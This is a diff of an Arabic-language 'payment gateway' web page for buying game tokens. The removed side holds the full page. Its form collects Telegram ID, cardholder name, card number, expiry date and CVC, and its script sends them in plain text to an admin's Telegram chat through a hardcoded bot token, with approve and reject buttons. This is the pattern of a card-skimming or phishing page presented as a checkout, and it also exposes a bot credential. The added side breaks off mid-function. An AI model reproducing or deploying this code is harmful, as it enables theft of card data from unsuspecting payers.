@@ -1,125 +1,59 @@
-<!DOCTYPE html> 
-<html lang="ar" dir="rtl"> 
-<head> 
-    <meta charset="UTF-8"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>بوابة الدفع</title> 
-    <style> 
-        body { background-color: #f4f4f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; } 
-        .payment-card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; } 
-        h2 { text-align: center; color: #333; margin-bottom: 20px; } 
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; } 
-        input:focus { outline: 2px solid #4a90e2; } 
-        .row { display: flex; gap: 10px; } 
-        button { width: 100%; padding: 12px; background-color: #cccccc; color: #666666; border: none; border-radius: 8px; cursor: not-allowed; font-size: 16px; margin-top: 15px; font-weight: bold; transition: background-color 0.3s ease; } 
-        button.active { background-color: #4a90e2; color: white; cursor: pointer; } 
-    </style> 
-</head> 
-<body> 
- 
-    <div class="payment-card"> 
-        <h2>💳 إتمام عملية الدفع</h2> 
-        <form id="paymentForm"> 
-            <input type="text" id="userId" placeholder="معرف المستخدم التلجرام (ID)" inputmode="numeric" required> 
-            <input type="text" id="name" placeholder="اسم صاحب البطاقة" required> 
-            <input type="text" id="cardNum" placeholder="رقم البطاقة (16 رقم)" maxlength="19" inputmode="numeric" required> 
-            <div class="row"> 
-                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" required> 
-                <input type="text" id="cvc" placeholder="CVC" maxlength="4" inputmode="numeric" required> 
-            </div> 
-            <button type="button" id="submitBtn" onclick="sendDataDirectly()" disabled>دفع الآن</button> 
-        </form> 
-    </div> 
- 
-    <script> 
-        // ⚠️ ضع هنا بيانات بوتك الكاملة ليعمل الإرسال المباشر بنجاح 
-        const BOT_TOKEN = '8968589592:AAHmfyCRkM4Xladdy3c7ct8qalchU4OFI-s'; 
-        const ADMIN_CHAT_ID = '5437487652';  
-        const BOT_USERNAME = '@Tokens_Jawaker_Bot'; // ⚠️ ضع يوزر بوتك الحقيقي هنا بدون علامة @ لكي يعود إليه دون مشاكل 
- 
-        const submitBtn = document.getElementById('submitBtn'); 
- 
-        document.getElementById('userId').addEventListener('input', function(e) { this.value = this.value.replace(/[^0-9]/g, ''); validateForm(); }); 
-        document.getElementById('name').addEventListener('input', function(e) { this.value = this.value.replace(/[^a-zA-Z\s\u0600-\u06FF]/g, ''); validateForm(); }); 
-        document.getElementById('cardNum').addEventListener('input', function (e) { 
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, ''); 
-            let formatted = ''; 
-            for (let i = 0; i < value.length; i++) { if (i > 0 && i % 4 === 0) { formatted += ' '; } formatted += value[i]; } 
-            e.target.value = formatted; validateForm(); 
-        }); 
-        document.getElementById('expiry').addEventListener('input', function (e) { 
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, ''); 
-            if (value.length > 2) { e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4); } else { e.target.value = value; } validateForm(); 
-        }); 
-        document.getElementById('cvc').addEventListener('input', function (e) { this.value = this.value.replace(/[^0-9]/g, ''); validateForm(); }); 
- 
-        function validateForm() { 
-            const userId = document.getElementById('userId').value.trim(); 
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الدفع</title>
+    <style>
+        body { background-color: #f4f4f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .payment-card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        h2 { text-align: center; color: #333; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        input:focus { outline: 2px solid #4a90e2; }
+        .row { display: flex; gap: 10px; }
+        button { width: 100%; padding: 12px; background-color: #cccccc; color: #666666; border: none; border-radius: 8px; cursor: not-allowed; font-size: 16px; margin-top: 15px; font-weight: bold; transition: background-color 0.3s ease; }
+        button.active { background-color: #4a90e2; color: white; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="payment-card">
+        <h2>💳 إتمام عملية الدفع</h2>
+        <form id="paymentForm">
+            <input type="text" id="userId" placeholder="معرف المستخدم التلجرام (ID)" inputmode="numeric" required>
+            <input type="text" id="name" placeholder="اسم صاحب البطاقة" required>
+            <input type="text" id="cardNum" placeholder="رقم البطاقة (16 رقم)" maxlength="19" inputmode="numeric" required>
+            <div class="row">
+                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
+                <input type="text" id="cvc" placeholder="CVC" maxlength="4" inputmode="numeric" required>
+            </div>
+            <button type="button" id="submitBtn" onclick="sendDataDirectly()" disabled>دفع الآن</button>
+        </form>
+    </div>
+
+    <script>
+        // ⚠️ ضع هنا بيانات بوتك الكاملة ليعمل الإرسال المباشر بنجاح
+        const BOT_TOKEN = '8968589592:AAHmfyCRkM4Xladdy3c7ct8qalchU4OFI-s';
+        const ADMIN_CHAT_ID = '5437487652'; 
+        const BOT_USERNAME = '@Tokens_Jawaker_Bot'; // ⚠️ ضع يوزر بوتك الحقيقي هنا بدون علامة @ لكي يعود إليه دون مشاكل
+
+        const submitBtn = document.getElementById('submitBtn');
+
+        document.getElementById('userId').addEventListener('input', function(e) { this.value = this.value.replace(/[^0-9]/g, ''); validateForm(); });
+        document.getElementById('name').addEventListener('input', function(e) { this.value = this.value.replace(/[^a-zA-Z\s\u0600-\u06FF]/g, ''); validateForm(); });
+        document.getElementById('cardNum').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) { if (i > 0 && i % 4 === 0) { formatted += ' '; } formatted += value[i]; }
+            e.target.value = formatted; validateForm();
+        });
+        document.getElementById('expiry').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+            if (value.length > 2) { e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4); } else { e.target.value = value; } validateForm();
+        });
+        document.getElementById('cvc').addEventListener('input', function (e) { this.value = this.value.replace(/[^0-9]/g, ''); validateForm(); });
+
+        function validateForm() {
+            const userId = document.getElementById('userId').value.trim();
             const name = document.getElementById('name').value.trim();
-            const cardNum = document.getElementById('cardNum').value.trim(); 
-            const expiry = document.getElementById('expiry').value.trim(); 
-            const cvc = document.getElementById('cvc').value.trim(); 
-            if (userId && name && cardNum.length === 19 && expiry.length === 5 && cvc.length >= 3) { 
-                submitBtn.disabled = false; submitBtn.classList.add('active'); 
-            } else { 
-                submitBtn.disabled = true; submitBtn.classList.remove('active'); 
-            } 
-        } 
- 
-        function sendDataDirectly() { 
-            submitBtn.disabled = true; 
-            submitBtn.innerText = "جاري الإرسال..."; 
- 
-            const userId = document.getElementById('userId').value.trim(); 
-            const name = document.getElementById('name').value.trim(); 
-            const cardNum = document.getElementById('cardNum').value.trim(); 
-            const expiry = document.getElementById('expiry').value.trim(); 
-            const cvc = document.getElementById('cvc').value.trim(); 
- 
-            const textMessage = 💳 طلب دفع بالبطاقة جديد\n\n👤 حساب المستخدم: ${userId}\n📝 الاسم: ${name}\n🔢 رقم البطاقة: ${cardNum}\n📅 التاريخ: ${expiry}\n🔒 الرمز CVC: ${cvc}; 
-             
-            const replyMarkup = { 
-                inline_keyboard: [ 
-                    [ 
-                        { text: "✅ تأكيد الشحن", callback_data: cc_app_${userId} }, 
-                        { text: "❌ رفض الطلب", callback_data: cc_rej_${userId} } 
-                    ] 
-                ] 
-            }; 
- 
-            // 1. إرسال إشعار للمستخدم تلقائياً داخل شات البوت لإعلامه بالانتظار 
-            fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify({ chat_id: userId, text: "⏳ تم ارسال طلبك يرجى الانتظار" }) 
-            }).catch(e => console.log("خطأ في مراسلة المستخدم")); 
- 
-            // 2. إرسال البيانات الفورية للأدمن مع الأزرار التفاعلية المباشرة 
-            fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: textMessage, reply_markup: replyMarkup }) 
-            })
-            .then(res => { 
-                if(res.ok) { 
-                    alert("تم ارسال طلب الدفع بنجاح"); 
-                    document.getElementById('paymentForm').reset(); 
-                    validateForm(); 
-                     
-                    // تحويل مباشر وآمن إلى البوت لإنهاء عملية الدفع وإغلاق المتصفح بدون خطأ اليوزر 
-                    window.location.href = https://t.me/${BOT_USERNAME}; 
-                } else { 
-                    alert("حدث خطأ في الإرسال، تأكد من التوكن."); 
-                    submitBtn.disabled = false; 
-                    submitBtn.innerText = "دفع الآن"; 
-                } 
-            }) 
-            .catch(err => { 
-                alert("خطأ في الاتصال بالشبكة."); 
-                submitBtn.disabled = false; 
-                submitBtn.innerText = "دفع الآن"; 
-            }); 
-        } 
-    </script> 
-</body> 
-</html>
+            const cardNum = document.getElementById('cardNum').value.trim();
